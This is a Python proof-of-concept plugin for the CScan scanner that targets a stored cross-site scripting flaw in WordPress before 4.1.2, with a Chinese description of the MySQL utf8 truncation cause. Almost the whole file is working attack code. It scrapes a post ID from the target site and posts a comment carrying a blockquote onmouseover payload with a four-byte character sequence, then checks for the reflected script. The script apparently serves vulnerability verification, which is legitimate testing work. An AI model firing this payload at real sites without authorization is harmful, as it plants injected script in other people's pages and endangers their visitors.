# coding: utf-8
import re
import random
import string

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0102'  # 平台漏洞编号，留空
    name = 'WordPress < 4.1.2 /wp-comments-post.php 存储型XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        该问题由 mysql 的一个特性引起，在 mysql 的 utf8 字符集中，一个字符由1~3个字节组成，
        对于大于3个字节的字符，mysql 使用了 utf8mb4 的形式来存储。
        如果我们将一个 utf8mb4 字符插入到 utf8 编码的列中，那么在mysql的非strict mode下，
        他会将后面的内容截断，导致我们可以利用这一缺陷完成 XSS 攻击。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = '<4.1.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b62185d5-640b-44a7-b7b3-b4effe065829'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target = self.target
            verify_url = target + "/wp-comments-post.php"

            def rand_str(length): return ''.join(
                random.sample(string.ascii_letters, length))
            try:
                post_id = re.search(r'post-(?P<post_id>[\\d]+)',
                                    requests.get(target).text).group('post_id')
            except:
                return
            ttys = "test<blockquote cite='%s onmouseover=alert(1)// \\xD8\\x34\\xDF\\x06'>"
            flag = rand_str(10)
            payload = {
                'author': rand_str(10),
                'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
                'url': 'http://www.beebeeto.com',
                'comment': ttys % flag,
                'comment_post_ID': post_id,
                'comment_parent': 0,
            }

            content = requests.post(verify_url, data=payload).text
            if '<blockquote cite=&#8217;%s onmouseover=alert(1)' % flag in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
